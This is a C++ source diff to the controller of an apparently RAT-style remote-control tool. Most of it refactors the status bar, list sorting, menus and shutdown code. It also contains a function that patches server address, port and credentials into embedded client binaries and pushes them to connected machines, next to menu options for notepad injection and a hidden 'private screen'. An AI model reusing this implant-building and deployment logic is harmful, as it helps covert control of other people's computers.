+            ULONGLONG hours = totalRunMs / (1000 * 60 * 60);
+            ULONGLONG days = hours / 24;
+            hours %= 24;
+
+            CString strTime;
+            if (days > 0)
+                strTime.Format(_T("%llud%lluh"), days, hours);
+            else
+                strTime.Format(_T("%lluh"), hours);
+            strRuntime = _TR("运行:") + CString(_T(" ")) + strTime + _T(" ") + _TR("(无崩溃)");
+        }
+    }
+    // === 分区1：FRP 地址 ===
+    // 优先显示上级配置的 FRPC，其次显示本机 FRPS
+    CString strFrpDisplay = m_strFrpAddr;
+    if (strFrpDisplay.IsEmpty()) {
+        // 没有上级 FRP 配置，检查本机是否配置了 FRPS
+        if (CFrpsForSubDlg::IsFrpsConfigured()) {
+            FrpsConfig frpsCfg = CFrpsForSubDlg::GetFrpsConfig();
+            if (frpsCfg.localFrps) {
+                strFrpDisplay.Format(_T("FRPS %s:%d"), m_localPublicIP.empty() ? 
+                    m_localPrivateIP.c_str() : m_localPublicIP.c_str(), frpsCfg.port);
+            } else {
+                strFrpDisplay.Format(_T("FRPS %hs:%d"), frpsCfg.server.c_str(), frpsCfg.port);
+            }
+        }
+        else if (m_settings.UsingFRPProxy) {
+            strFrpDisplay.Format(_T("%s:%d"), THIS_CFG.GetStr("settings", "master").c_str(), 
+                THIS_CFG.Get1Int("settings", "ghost", 6543));
+        }
+        else if (!m_localPublicIP.empty()) {
+            strFrpDisplay.Format(_T("WAN %s:%d"), m_localPublicIP.c_str(), THIS_CFG.Get1Int("settings", "ghost", 6543));
+        }
+        else {
+            strFrpDisplay.Format(_T("LAN %s:%d"), m_localPrivateIP.c_str(), THIS_CFG.Get1Int("settings", "ghost", 6543));
+        }
+    }
+    // 根据是否有内容设置分区宽度
+    int paneFrpWidth =  250;
+    m_StatusBar.SetPaneInfo(1, m_StatusBar.GetItemID(1), SBPS_NORMAL, paneFrpWidth);
+    m_StatusBar.SetPaneText(1, strFrpDisplay);
+
+    m_StatusBar.SetPaneText(2, strRuntime);
+
+    // === 分区3：到期时间 ===
+    // 定期刷新到期时间（每 5 分钟从配置重新读取，以便反映上级延展）
+    static ULONGLONG lastExpireRefresh = 0;
+    ULONGLONG now = GetTickCount64();
+    if (now - lastExpireRefresh > 5 * 60 * 1000) {  // 5 分钟
+        lastExpireRefresh = now;
+        std::string pwd = THIS_CFG.GetStr("settings", "Password", "");
+        if (!pwd.empty()) {
+            std::string expireDate = ParseExpireDateFromPasscode(pwd);
+            m_strExpireDate = expireDate.c_str();
+        }
+    }
+
+    if (!m_strExpireDate.IsEmpty()) {
+        // 解析到期日期 (YYYYMMDD)
+        int year = _ttoi(m_strExpireDate.Left(4));
+        int month = _ttoi(m_strExpireDate.Mid(4, 2));
+        int day = _ttoi(m_strExpireDate.Mid(6, 2));
+
+        // 计算剩余天数（包含今天）
+        SYSTEMTIME stExpire = {0}, stNow = {0};
+        stExpire.wYear = (WORD)year;
+        stExpire.wMonth = (WORD)month;
+        stExpire.wDay = (WORD)day;
+        GetLocalTime(&stNow);
+        // 归一化到当天 00:00:00，只比较日期部分
+        stNow.wHour = stNow.wMinute = stNow.wSecond = stNow.wMilliseconds = 0;
+
+        FILETIME ftExpire, ftNow;
+        SystemTimeToFileTime(&stExpire, &ftExpire);
+        SystemTimeToFileTime(&stNow, &ftNow);
+
+        ULARGE_INTEGER uliExpire, uliNow;
+        uliExpire.LowPart = ftExpire.dwLowDateTime;
+        uliExpire.HighPart = ftExpire.dwHighDateTime;
+        uliNow.LowPart = ftNow.dwLowDateTime;
+        uliNow.HighPart = ftNow.dwHighDateTime;
+
+        // FILETIME 单位是 100ns，转换为天数，+1 包含到期当天
+        LONGLONG diffDays = (LONGLONG)(uliExpire.QuadPart - uliNow.QuadPart) / (10000000LL * 60 * 60 * 24) + 1;
+
+        if (diffDays <= 0) {
+            strExpire = _TR("已过期");
+        } else {
+            CString strDate, strDays;
+            strDate.Format(_T("%04d-%02d-%02d"), year, month, day);
+            strDays.Format(_T("(%lld"), diffDays);
+            strExpire = _TR("到期:") + CString(_T(" ")) + strDate + _T(" ") + strDays + _TR("天") + _T(")");
+        }
+        m_StatusBar.SetPaneText(3, strExpire);
+    }
 }
 
 void CMy2015RemoteDlg::DeletePopupWindow(BOOL bForce)
@@ -1625,8 +3280,7 @@ void CMy2015RemoteDlg::DeletePopupWindow(BOOL bForce)
     if (!m_pFloatingTip)
         return;
 
-    if (!bForce && ::IsWindow(m_pFloatingTip->GetSafeHwnd()))
-    {
+    if (!bForce && ::IsWindow(m_pFloatingTip->GetSafeHwnd())) {
         CPoint pt;
         GetCursorPos(&pt);
         CRect rc;
@@ -1648,16 +3302,28 @@ void CMy2015RemoteDlg::OnClose()
 {
     // 隐藏窗口而不是关闭
     ShowWindow(SW_HIDE);
+	if (m_pSearchBar && m_pSearchBar->GetSafeHwnd()) {
+        m_pSearchBar->ShowWindow(SW_HIDE);
+    }
     Mprintf("======> Hide\n");
 }
 
 void CMy2015RemoteDlg::Release()
 {
     Mprintf("======> Release\n");
+
+    // 设置全局退出标志，通知所有分离线程停止
+    g_bAppExiting = true;
+
+    // Stop Web Remote Control service
+    if (WebService().IsRunning()) {
+        Mprintf("Stopping WebService...\n");
+        WebService().Stop();
+    }
+
     UninitFileUpload();
     DeletePopupWindow(TRUE);
     isClosed = TRUE;
-    m_frpStatus = STATUS_EXIT;
     ShowWindow(SW_HIDE);
 
     Shell_NotifyIcon(NIM_DELETE, &m_Nid);
@@ -1679,9 +3345,19 @@ void CMy2015RemoteDlg::Release()
         // 那么此时不要再 delete m_pClientListDlg，只需将指针置 NULL 即可
         m_pClientListDlg = nullptr;
     }
+    if (m_pLicenseDlg != nullptr) {
+        if (::IsWindow(m_pLicenseDlg->GetSafeHwnd())) {
+            m_pLicenseDlg->DestroyWindow();
+        }
+        delete m_pLicenseDlg;
+        m_pLicenseDlg = nullptr;
+    }
     Sleep(500);
-    while (m_hFRPThread)
-        Sleep(20);
+    StopAllFrpClients();
+#ifdef _WIN64
+    StopLocalFrpsServer();  // 停止本地 FRPS 服务器
+#endif
+    StopFrpcAuto();  // 停止 FRP 自动代理
 
     THIS_APP->Destroy();
     SAFE_DELETE(m_gridDlg);
@@ -1690,6 +3366,7 @@ void CMy2015RemoteDlg::Release()
     SAFE_CLOSE_HANDLE(m_hExit);
     m_hExit = NULL;
     Sleep(500);
+    SAFE_DELETE(m_IPConverter);
 
     timeEndPeriod(1);
 }
@@ -1723,11 +3400,31 @@ void CMy2015RemoteDlg::SortByColumn(int nColumn)
         m_bSortAscending = true;
     }
 
-    // 创建排序信息
-    std::pair<int, bool> sortInfo(m_nSortColumn, m_bSortAscending);
+    // 虚拟列表：对数据源进行排序
     EnterCriticalSection(&m_cs);
-    m_CList_Online.SortItems(CompareFunction, reinterpret_cast<LPARAM>(&sortInfo));
+    int col = m_nSortColumn;
+    bool asc = m_bSortAscending;
+    std::sort(m_HostList.begin(), m_HostList.end(),
+        [col, asc](context* a, context* b) {
+            CString s1 = a ? a->GetClientData(col) : "";
+            CString s2 = b ? b->GetClientData(col) : "";
+            int result = s1.Compare(s2);
+            return asc ? (result < 0) : (result > 0);
+        });
+
+    // 重建索引映射
+    m_ClientIndex.clear();
+    for (size_t i = 0; i < m_HostList.size(); ++i) {
+        if (m_HostList[i]) {
+            m_ClientIndex[m_HostList[i]->GetClientID()] = i;
+        }
+    }
+    // 重建过滤索引
+    RebuildFilteredIndices();
     LeaveCriticalSection(&m_cs);
+
+    // 刷新列表
+    m_CList_Online.Invalidate();
 }
 
 void CMy2015RemoteDlg::OnHdnItemclickList(NMHDR* pNMHDR, LRESULT* pResult)
@@ -1738,6 +3435,54 @@ void CMy2015RemoteDlg::OnHdnItemclickList(NMHDR* pNMHDR, LRESULT* pResult)
     *pResult = 0;
 }
 
+// 虚拟列表数据回调 - 当列表需要显示某行某列的数据时调用
+void CMy2015RemoteDlg::OnGetDispInfo(NMHDR* pNMHDR, LRESULT* pResult)
+{
+    NMLVDISPINFO* pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);
+    LVITEM* pItem = &pDispInfo->item;
+    int iItem = pItem->iItem;
+
+    // 加锁保护 m_FilteredIndices 和 m_HostList 访问
+    CLock lock(m_cs);
+
+    // 边界检查（使用过滤后的索引）
+    if (iItem < 0 || iItem >= (int)m_FilteredIndices.size()) {
+        *pResult = 0;
+        return;
+    }
+
+    // 通过过滤索引获取实际的 context
+    size_t realIdx = m_FilteredIndices[iItem];
+    if (realIdx >= m_HostList.size()) {
+        *pResult = 0;
+        return;
+    }
+
+    context* ctx = m_HostList[realIdx];
+    if (!ctx) {
+        *pResult = 0;
+        return;
+    }
+
+    // 提供文本数据
+    if (pItem->mask & LVIF_TEXT) {
+        CString text;
+        int nCol = pItem->iSubItem;
+
+        // 备注列特殊处理
+        if (nCol == ONLINELIST_COMPUTER_NAME) {
+            CString note = m_ClientMap->GetClientMapData(ctx->GetClientID(), MAP_NOTE);
+            text = !note.IsEmpty() ? note : ctx->GetClientData(nCol);
+        } else {
+            text = ctx->GetClientData(nCol);
+            if (text.IsEmpty()) text = "?";
+        }
+
+        lstrcpyn(pItem->pszText, text, pItem->cchTextMax);
+    }
+
+    *pResult = 0;
+}
 
 void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 {
@@ -1767,17 +3512,112 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
     Menu.SetMenuItemBitmaps(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND, &m_bmOnline[11], &m_bmOnline[11]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_ASSIGN_TO, MF_BYCOMMAND, &m_bmOnline[12], &m_bmOnline[12]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_ADD_WATCH, MF_BYCOMMAND, &m_bmOnline[13], &m_bmOnline[13]);
+    Menu.SetMenuItemBitmaps(ID_ONLINE_LOGIN_NOTIFY, MF_BYCOMMAND, &m_bmOnline[20], &m_bmOnline[20]);
+    // Disable login notify menu if PowerShell is not available
+    if (!GetNotifyManager().IsPowerShellAvailable()) {
+        Menu.EnableMenuItem(ID_ONLINE_LOGIN_NOTIFY, MF_BYCOMMAND | MF_GRAYED);
+    }
     Menu.SetMenuItemBitmaps(ID_ONLINE_RUN_AS_ADMIN, MF_BYCOMMAND, &m_bmOnline[14], &m_bmOnline[14]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_UNINSTALL, MF_BYCOMMAND, &m_bmOnline[15], &m_bmOnline[15]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_PRIVATE_SCREEN, MF_BYCOMMAND, &m_bmOnline[16], &m_bmOnline[16]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_REGROUP, MF_BYCOMMAND, &m_bmOnline[17], &m_bmOnline[17]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_INJ_NOTEPAD, MF_BYCOMMAND, &m_bmOnline[18], &m_bmOnline[18]);
     Menu.SetMenuItemBitmaps(ID_PROXY_PORT, MF_BYCOMMAND, &m_bmOnline[19], &m_bmOnline[19]);
+    // Session management icons (shutdown/reboot/logout)
+    Menu.SetMenuItemBitmaps(ID_MACHINE_SHUTDOWN, MF_BYCOMMAND, &m_bmOnline[21], &m_bmOnline[21]);
+    Menu.SetMenuItemBitmaps(ID_MACHINE_REBOOT, MF_BYCOMMAND, &m_bmOnline[22], &m_bmOnline[22]);
+    Menu.SetMenuItemBitmaps(ID_MACHINE_LOGOUT, MF_BYCOMMAND, &m_bmOnline[23], &m_bmOnline[23]);
+    Menu.SetMenuItemBitmaps(ID_PROXY_PORT_STD, MF_BYCOMMAND, &m_bmOnline[24], &m_bmOnline[24]);
+    Menu.SetMenuItemBitmaps(ID_CANCEL_SHARE, MF_BYCOMMAND, &m_bmOnline[50], &m_bmOnline[50]);
 
-    std::string masterHash(GetMasterHash());
-    if (GetPwdHash() != masterHash) {
-        Menu.DeleteMenu(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND);
-        Menu.DeleteMenu(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND);
+    Menu.ModifyMenuL(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND | MF_STRING, ID_ONLINE_AUTHORIZE, _T("发送授权"));
+
+    // ============================================================
+    //  UIBranding: 根据编译时配置或运行时功能标志隐藏右键菜单项
+    // ============================================================
+    if (SHOULD_HIDE_CTX(HIDE_CTX_MESSAGE, CF_MESSAGE))
+        SubMenu->DeleteMenu(ID_ONLINE_MESSAGE, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_UPDATE, CF_UPDATE))
+        SubMenu->DeleteMenu(ID_ONLINE_UPDATE, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_DELETE, CF_DELETE))
+        SubMenu->DeleteMenu(ID_ONLINE_DELETE, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_SHARE, CF_SHARE))
+        SubMenu->DeleteMenu(ID_ONLINE_SHARE, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_PROXY, CF_PROXY))
+        SubMenu->DeleteMenu(ID_MAIN_PROXY, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_HOSTNOTE, CF_HOSTNOTE))
+        SubMenu->DeleteMenu(ID_ONLINE_HOSTNOTE, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_VIRTUAL_DESKTOP, CF_VIRTUAL_DESKTOP))
+        SubMenu->DeleteMenu(ID_ONLINE_VIRTUAL_DESKTOP, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_GRAY_DESKTOP, CF_GRAY_DESKTOP))
+        SubMenu->DeleteMenu(ID_ONLINE_GRAY_DESKTOP, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_REMOTE_DESKTOP, CF_REMOTE_DESKTOP))
+        SubMenu->DeleteMenu(ID_ONLINE_REMOTE_DESKTOP, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_H264_DESKTOP, CF_H264_DESKTOP))
+        SubMenu->DeleteMenu(ID_ONLINE_H264_DESKTOP, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_AUTHORIZE, CF_AUTHORIZE))
+        SubMenu->DeleteMenu(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_UNAUTHORIZE, CF_UNAUTHORIZE))
+        SubMenu->DeleteMenu(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_ASSIGN_TO, CF_ASSIGN_TO))
+        SubMenu->DeleteMenu(ID_ONLINE_ASSIGN_TO, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_ADD_WATCH, CF_ADD_WATCH))
+        SubMenu->DeleteMenu(ID_ONLINE_ADD_WATCH, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_LOGIN_NOTIFY, CF_LOGIN_NOTIFY))
+        SubMenu->DeleteMenu(ID_ONLINE_LOGIN_NOTIFY, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_RUN_AS_ADMIN, CF_RUN_AS_ADMIN))
+        SubMenu->DeleteMenu(ID_ONLINE_RUN_AS_ADMIN, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_UNINSTALL, CF_UNINSTALL))
+        SubMenu->DeleteMenu(ID_ONLINE_UNINSTALL, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_PRIVATE_SCREEN, CF_PRIVATE_SCREEN))
+        SubMenu->DeleteMenu(ID_ONLINE_PRIVATE_SCREEN, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_REGROUP, CF_REGROUP))
+        SubMenu->DeleteMenu(ID_ONLINE_REGROUP, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_INJ_NOTEPAD, CF_INJ_NOTEPAD))
+        SubMenu->DeleteMenu(ID_ONLINE_INJ_NOTEPAD, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_PROXY_PORT, CF_PROXY_PORT))
+        SubMenu->DeleteMenu(ID_PROXY_PORT, MF_BYCOMMAND);
+    if (SHOULD_HIDE_CTX(HIDE_CTX_PROXY_PORT_STD, CF_PROXY_PORT_STD))
+        SubMenu->DeleteMenu(ID_PROXY_PORT_STD, MF_BYCOMMAND);
+
+    // --- 机器管理子菜单 ---
+    CMenu* pMachineMenu = FindSubMenuByCommand(SubMenu, ID_MACHINE_SHUTDOWN);
+    if (pMachineMenu) {
+        if (SHOULD_HIDE_CTX(HIDE_CTX_MACHINE_SHUTDOWN, CF_MACHINE_SHUTDOWN))
+            pMachineMenu->DeleteMenu(ID_MACHINE_SHUTDOWN, MF_BYCOMMAND);
+        if (SHOULD_HIDE_CTX(HIDE_CTX_MACHINE_REBOOT, CF_MACHINE_REBOOT))
+            pMachineMenu->DeleteMenu(ID_MACHINE_REBOOT, MF_BYCOMMAND);
+        if (SHOULD_HIDE_CTX(HIDE_CTX_MACHINE_LOGOUT, CF_MACHINE_LOGOUT))
+            pMachineMenu->DeleteMenu(ID_MACHINE_LOGOUT, MF_BYCOMMAND);
+        if (pMachineMenu->GetMenuItemCount() == 0) {
+            for (UINT i = 0; i < SubMenu->GetMenuItemCount(); i++) {
+                if (SubMenu->GetSubMenu(i) == pMachineMenu) {
+                    SubMenu->DeleteMenu(i, MF_BYPOSITION);
+                    break;
+                }
+            }
+        }
+    }
+
+    // --- 执行命令子菜单 ---
+    CMenu* pExecMenu = FindSubMenuByCommand(SubMenu, ID_EXECUTE_DOWNLOAD);
+    if (pExecMenu) {
+        if (SHOULD_HIDE_CTX(HIDE_CTX_EXECUTE_DOWNLOAD, CF_EXECUTE_DOWNLOAD))
+            pExecMenu->DeleteMenu(ID_EXECUTE_DOWNLOAD, MF_BYCOMMAND);
+        if (SHOULD_HIDE_CTX(HIDE_CTX_EXECUTE_UPLOAD, CF_EXECUTE_UPLOAD))
+            pExecMenu->DeleteMenu(ID_EXECUTE_UPLOAD, MF_BYCOMMAND);
+        if (SHOULD_HIDE_CTX(HIDE_CTX_EXECUTE_TESTRUN, CF_EXECUTE_TESTRUN))
+            pExecMenu->DeleteMenu(ID_EXECUTE_TESTRUN, MF_BYCOMMAND);
+        if (SHOULD_HIDE_CTX(HIDE_CTX_EXECUTE_GHOST, CF_EXECUTE_GHOST))
+            pExecMenu->DeleteMenu(ID_EXECUTE_GHOST, MF_BYCOMMAND);
+        if (pExecMenu->GetMenuItemCount() == 0) {
+            for (UINT i = 0; i < SubMenu->GetMenuItemCount(); i++) {
+                if (SubMenu->GetSubMenu(i) == pExecMenu) {
+                    SubMenu->DeleteMenu(i, MF_BYPOSITION);
+                    break;
+                }
+            }
+        }
     }
 
     // 创建一个新的子菜单
@@ -1806,9 +3646,6 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
         for (int i = 0; i < iCount; ++i) {
             SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
         }
-    } else if (GetPwdHash() != GetMasterHash()) {
-        SubMenu->EnableMenuItem(ID_ONLINE_AUTHORIZE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
-        SubMenu->EnableMenuItem(ID_ONLINE_UNAUTHORIZE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
     }
 
     // 刷新菜单显示
@@ -1825,6 +3662,52 @@ void CMy2015RemoteDlg::OnOnlineMessage()
     SendSelectedCommand(&bToken, sizeof(BYTE));
 }
 
+// 从资源中读取被控端文件，并根据用户选择修改连接信息后返回给发送线程
+BYTE* ReadExeFromResource(DWORD& outSize, int resourceId, int iType, int iStartup, 
+    const std::string& dir, const std::string& name, int cmd, int sizeofSize)
+{
+    DWORD dwFileSize = 0;
+    BYTE* szBuffer = ReadResource(resourceId, dwFileSize);
+    outSize = dwFileSize;
+    CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN };
+	char* pSearchStart = (char*)szBuffer;
+    int iOffset = MemoryFind(pSearchStart, (char*)g_ConnectAddress.Flag(), dwFileSize, g_ConnectAddress.FlagLen());
+    if (iOffset == -1) {
+        SAFE_DELETE(szBuffer);
+        return NULL;
+    }
+    // 获取有效地址（优先使用上级FRP配置）
+    std::string effectiveIP;
+    int effectivePort;
+    CMy2015RemoteDlg::GetEffectiveMasterAddress(effectiveIP, effectivePort);
+    if (effectiveIP.empty()) effectiveIP = "127.0.0.1";
+    std::string effectivePortStr = std::to_string(effectivePort);
+
+    while (iOffset != -1 && dwFileSize >= sizeof(CONNECT_ADDRESS)) {
+        CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(pSearchStart + iOffset);
+        dst->SetAdminId(GetMasterHash().c_str());
+        memcpy(dst->szFlag, GetMasterId().c_str(), 16);
+        strcpy_s(dst->szServerIP, effectiveIP.c_str());
+        strcpy_s(dst->szPort, effectivePortStr.c_str());
+        dst->Encrypt();
+        dst->iType = iType;
+        dst->iStartup = iStartup;
+        strcpy_s(dst->szBuildDate, DLL_VERSION);
+        memcpy(dst->pwdHash, GetPwdHash().c_str(), 64);
+        strcpy_s(dst->installDir, dir.c_str());
+        strcpy_s(dst->installName, name.c_str());
+        pSearchStart += iOffset + sizeof(CONNECT_ADDRESS);
+		dwFileSize -= iOffset + sizeof(CONNECT_ADDRESS);
+        iOffset = MemoryFind(pSearchStart, (char*)g_ConnectAddress.Flag(), dwFileSize, g_ConnectAddress.FlagLen());
+    }
+    BYTE *buffer = new BYTE[outSize + 1 + sizeofSize];
+    buffer[0] = cmd;
+    memcpy(buffer + 1, &outSize, sizeofSize);
+    memcpy(buffer + 1 + sizeofSize, szBuffer, outSize);
+    SAFE_DELETE_ARRAY(szBuffer);
+	return buffer;
+}
+
 void CMy2015RemoteDlg::OnOnlineUpdate()
 {
     context* ContextObject = nullptr;
@@ -1833,19 +3716,19 @@ void CMy2015RemoteDlg::OnOnlineUpdate()
     POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
     if (Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-        ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+        ContextObject = GetContextByListIndex(iItem);
     }
-	LeaveCriticalSection(&m_cs);
+    LeaveCriticalSection(&m_cs);
     if (n != 1 || !ContextObject) {
-		MessageBoxL(_T("请选择一个被控程序进行升级!"), _T("提示"), MB_ICONWARNING);
+        MessageBoxL(_T("请选择一个被控程序进行升级!"), _T("提示"), MB_ICONWARNING);
         return;
     }
     if (IDYES != MessageBoxL(_T("确定升级选定的被控程序吗?\n需受控程序支持方可生效!"),
-                            _T("提示"), MB_ICONQUESTION | MB_YESNO))
+                             _T("提示"), MB_ICONQUESTION | MB_YESNO))
         return;
     PBYTE buffer = nullptr;
-	ULONGLONG fileSize = 0;
-	CString clientType = ContextObject->GetAdditionalData(RES_CLIENT_TYPE).GetString();
+    ULONGLONG fileSize = 0;
+    CString clientType = ContextObject->GetAdditionalData(RES_CLIENT_TYPE).GetString();
     if (clientType == "EXE") {
         CUpdateDlg dlg(this);
         if (dlg.DoModal() != IDOK)
@@ -1855,43 +3738,18 @@ void CMy2015RemoteDlg::OnOnlineUpdate()
         std::filesystem::path path = ContextObject->GetAdditionalData(RES_FILE_PATH).GetString();
         std::string stem = path.stem().string();
         std::string dirName = path.parent_path().filename().string();
-        BYTE* szBuffer = ReadResource(dlg.m_nSelected ? (is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86) :
-            (is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86), dwFileSize);
-        CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN };
-        int iOffset = MemoryFind((char*)szBuffer, (char*)g_ConnectAddress.Flag(), dwFileSize, g_ConnectAddress.FlagLen());
-        if (iOffset == -1) {
-            SAFE_DELETE(szBuffer);
-            return;
-        }
-        CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(szBuffer + iOffset);
-        dst->SetAdminId(GetMasterHash().c_str());
-        memcpy(dst->szFlag, GetMasterId().c_str(), 16);
-        strcpy_s(dst->szServerIP, THIS_CFG.GetStr("settings", "master", "127.0.0.1").c_str());
-        strcpy_s(dst->szPort, THIS_CFG.GetStr("settings", "ghost", "6543").c_str());
-        dst->Encrypt();
-        dst->iType = dlg.m_nSelected ? CLIENT_TYPE_ONE : CLIENT_TYPE_MEMDLL;
-        dst->iStartup = dlg.m_nSelected ? Startup_GhostMsc : Startup_TestRunMsc;
-        strcpy_s(dst->szBuildDate, DLL_VERSION);
-        memcpy(dst->pwdHash, GetPwdHash().c_str(), 64);
-        strcpy_s(dst->installDir, dirName.c_str());
-        strcpy_s(dst->installName, stem.c_str());
-
+        buffer = ReadExeFromResource(dwFileSize, dlg.m_nSelected ? (is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86) :
+            (is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86), dlg.m_nSelected ? CLIENT_TYPE_ONE : CLIENT_TYPE_MEMDLL,
+            dlg.m_nSelected ? Startup_GhostMsc : Startup_TestRunMsc, dirName, stem, COMMAND_UPDATE, 8);
 		fileSize = dwFileSize;
-        buffer = new BYTE[fileSize + 9];
-		buffer[0] = COMMAND_UPDATE;
-        memcpy(buffer + 1, &fileSize, 8);
-		memcpy(buffer + 9, szBuffer, fileSize);
-		SAFE_DELETE_ARRAY(szBuffer);
-    }
-    else if (clientType == "DLL") {
+    } else if (clientType == "DLL") {
         Buffer* buf = m_ServerDLL[PAYLOAD_DLL_X64];
         fileSize = buf->length(true) - 6;
         buffer = new BYTE[fileSize + 9];
         buffer[0] = COMMAND_UPDATE;
         memcpy(buffer + 1, &fileSize, 8);
         memcpy(buffer + 9, buf->c_str() + 6, fileSize);
-    }
-    else if (clientType == "SC" || clientType == "MDLL") {
+    } else if (clientType == "SC" || clientType == "MDLL") {
         fileSize = 0;
         buffer = new BYTE[fileSize + 9]();
         buffer[0] = COMMAND_UPDATE;
@@ -1920,22 +3778,36 @@ void CMy2015RemoteDlg::OnOnlineDelete()
     SendSelectedCommand(&bToken, sizeof(BYTE));   //Context     PreSending   PostSending
 
     EnterCriticalSection(&m_cs);
-    int iCount = m_CList_Online.GetSelectedCount();
-    for (int i=0; i<iCount; ++i) {
-        POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
-        int iItem = m_CList_Online.GetNextSelectedItem(Pos);
-        CString strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);
-        context* ctx = (context*)m_CList_Online.GetItemData(iItem);
-        m_CList_Online.DeleteItem(iItem);
-        m_HostList.erase(ctx);
+    // 收集选中的索引（从大到小排序，避免删除时索引变化问题）
+    std::vector<int> selectedItems;
+    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+    while (Pos) {
+        selectedItems.push_back(m_CList_Online.GetNextSelectedItem(Pos));
+    }
+    std::sort(selectedItems.rbegin(), selectedItems.rend());
+
+    for (int iItem : selectedItems) {
+        context* ctx = GetContextByListIndex(iItem);
+        if (!ctx) continue;
+
+        CString strIP = ctx->GetClientData(ONLINELIST_IP);
         auto tm = ctx->GetAliveTime();
         std::string aliveInfo = tm >= 86400 ? floatToString(tm / 86400.f) + " d" :
                                 tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
                                 tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
+        RemoveFromHostList(ctx);
         ctx->Destroy();
         strIP += _L(_T("断开连接"));
         ShowMessage(_TR("操作成功"), strIP + "[" + aliveInfo.c_str() + "]");
         Mprintf("%s 断开链接 [%s]\n", strIP, aliveInfo.c_str());
+    }
+
+    // 虚拟列表：重建过滤索引并更新项目计数
+    RebuildFilteredIndices();
+    m_CList_Online.SetItemCountExV((int)m_FilteredIndices.size(), LVSICF_NOINVALIDATEALL | LVSICF_NOSCROLL);
+    {
+        CListCtrlEx::ScopedEraseBkgnd scope(m_CList_Online);
+        m_CList_Online.RedrawWindow(NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_UPDATENOW);
     }
     LeaveCriticalSection(&m_cs);
 }
@@ -1960,7 +3832,8 @@ VOID CMy2015RemoteDlg::OnOnlineWindowManager()
 }
 
 // 是否继续远程控制：如果选择多个，则继续；如果选择单个且用户锁屏无SYSTEM权限，则提示
-BOOL CMy2015RemoteDlg::ShouldRemoteControl() {
+BOOL CMy2015RemoteDlg::ShouldRemoteControl()
+{
     context* ContextObject = nullptr;
     EnterCriticalSection(&m_cs);
     int count = m_CList_Online.GetSelectedCount();
@@ -1968,9 +3841,11 @@ BOOL CMy2015RemoteDlg::ShouldRemoteControl() {
     CString activeWnd, userName;
     if (Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-        ContextObject = (context*)m_CList_Online.GetItemData(iItem);
-        activeWnd = m_CList_Online.GetItemText(iItem, ONLINELIST_LOGINTIME);
-        userName = ContextObject->GetAdditionalData(RES_USERNAME);
+        ContextObject = GetContextByListIndex(iItem);
+        if (ContextObject) {
+            activeWnd = ContextObject->GetClientData(ONLINELIST_LOGINTIME);
+            userName = ContextObject->GetAdditionalData(RES_USERNAME);
+        }
     }
     LeaveCriticalSection(&m_cs);
     if (count == 1 && userName != "SYSTEM" && activeWnd.Find("Locked") == 0) {
@@ -1980,15 +3855,27 @@ BOOL CMy2015RemoteDlg::ShouldRemoteControl() {
